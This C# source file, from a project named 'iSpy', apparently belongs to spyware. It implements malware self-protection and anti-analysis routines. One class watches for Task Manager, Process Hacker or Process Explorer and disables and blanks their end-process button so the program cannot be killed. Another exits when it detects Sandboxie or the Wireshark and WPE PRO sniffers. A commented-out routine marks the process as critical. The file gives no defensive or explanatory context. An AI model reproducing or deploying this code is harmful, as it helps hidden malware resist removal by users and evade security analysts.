using System;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Microsoft.Win32;
namespace iSpy
{
    public class Services
    {
        /*
        [DllImport("user32.dll")]
        private static extern int CallWindowProcA(VarPtrCallbackDelegate lpPrevWndFunc, ref int hWnd, int Msg, int wParam, int lParam);
        [DllImport("ntdll.dll")]
        private static extern int ZwSetInformationProcess(IntPtr processHandle, IntPtr processInformationClass, IntPtr processInformation, IntPtr processInformationLength);
        private delegate int VarPtrCallbackDelegate(int address, int x, int y, int z);
        private static int VarPtrCallback(int address, int x, int y, int z)
        {
            return address;
        }

        public static void ProtectProcess()
        {
            int var = -2147421911;
            ZwSetInformationProcess(Process.GetCurrentProcess().Handle, (IntPtr)0x21L, (IntPtr)CallWindowProcA(new VarPtrCallbackDelegate(VarPtrCallback), ref var, 0, 0, 0), (IntPtr)4L);
        }
        */
        public static void ModifyTaskManager()
        {
            new Thread(new ThreadStart(new ProcessProtection().Protect)).Start();
        }
        public static void AntiDebuggers()
        {
            new Thread(new ThreadStart(new AntiDebugger().Scan)).Start();
        }

        private class ProcessProtection
        {
            [DllImport("user32.dll")]
            private static extern bool EnableWindow(IntPtr hWnd, bool bEnable);
            [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
            private static extern int EnumChildWindows(IntPtr hWnd, EnumWindProc lpEnumFunc, ref IntPtr lParam);
            [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
            private static extern int GetClassName(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, int nMaxCount);
            [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
            private static extern IntPtr GetForegroundWindow();
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern int GetWindowText(int hwnd, StringBuilder lpString, int cch);
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern int GetWindowTextLength(int hwnd);
            [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
            private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);
            [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
            private static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lParam);
            private delegate bool EnumChildWindProc(int hWnd, int lParam);
            private delegate bool EnumWindProc(int hWnd, int lParam);
            private List<IntPtr> CLD = new List<IntPtr>();
            private IntPtr[] GetChild(IntPtr hwd)
            {
                ProcessProtection manager = this;
                lock (manager)
                {
                    CLD.Clear();
                    IntPtr zero = IntPtr.Zero;
                    EnumChildWindows(hwd, new EnumWindProc(EnumChild), ref zero);
                    return CLD.ToArray();
                }
            }
            private bool EnumChild(int hWnd, int lParam)
            {
                CLD.Add((IntPtr)hWnd);
                return true;
            }
            public void Protect()
            {
                while (true)
                {
                    IntPtr foregroundWindow = GetForegroundWindow();
                    if (foregroundWindow.ToInt32() != 0)
                    {
                        int lpdwProcessID = 0;
                        GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
                        if (lpdwProcessID > 0)
                        {
                            string str = string.Empty;
                            int windowTextLength = GetWindowTextLength((int)foregroundWindow);
                            if (windowTextLength == 0)
                            {
                                str = string.Empty;
                            }
                            else
                            {
                                StringBuilder lpString = new StringBuilder(windowTextLength + 1);
                                if (GetWindowText((int)foregroundWindow, lpString, lpString.Capacity) == 0)
                                {
                                    str = string.Empty;
                                }
                                else
                                {
                                    str = lpString.ToString();
                                }
                            }
                            Process processById = Process.GetProcessById(lpdwProcessID);
                            if (((processById.ProcessName.ToLower().Equals("taskmgr")) || (processById.ProcessName.ToLower().Equals("processhacker"))) || (str.ToLower().Equals("process explorer")))
                            {
                                List<IntPtr> list = new List<IntPtr>();
                                int count = 0;
                                foreach (IntPtr hWnd in GetChild(foregroundWindow))
                                {
                                    string lpClassName = new String(' ', 200);
                                    int startIndex = GetClassName((int)hWnd, ref lpClassName, 200);
                                    lpClassName = lpClassName.Remove(startIndex, 200 - startIndex);
                                    if (lpClassName.ToLower().Equals("button"))
                                    {
                                        list.Add(hWnd);
                                    }
                                    if ((lpClassName.ToLower().Equals("static")) || (lpClassName.ToLower().Equals("directuihwnd")))
                                    {
                                        count++;
                                    }
                                }
                                if ((list.Count == 2) && ((count == 2) || (count == 1)))
                                {
                                    EnableWindow(list[0], false);
                                    string lParam = string.Empty;
                                    SendMessage((int)list[0], 12, 0, ref lParam);
                                }
                            }
                        }
                    }
                }
            }
        }
        private class AntiDebugger
        {
            [DllImport("kernel32.dll")]
            private static extern IntPtr GetModuleHandle(string lpModuleName);
            private Process[] processList;
            private bool DetectSandboxie()
            {
                return (GetModuleHandle("SbieDll.dll").ToInt32() != 0);
            }

            private bool DetectSniffers()
            {
                processList = Process.GetProcesses();
                foreach (Process proc in processList)
                {
                    if (proc.MainWindowTitle.Equals("The Wireshark Network Analyzer") || proc.MainWindowTitle.Equals("WPE PRO"))
                    {
                        return true;
                    }
                }
                return false;
            }

            public void Scan()
            {
                while (true)
                {
                    if (DetectSandboxie() || DetectSniffers())
                    {
                       // Console.WriteLine("Emulation Detected!");
                        //Console.Read();
                        Environment.Exit(0);
                    }
                    Thread.Sleep(10000);
                }
            }
        }
    }
}
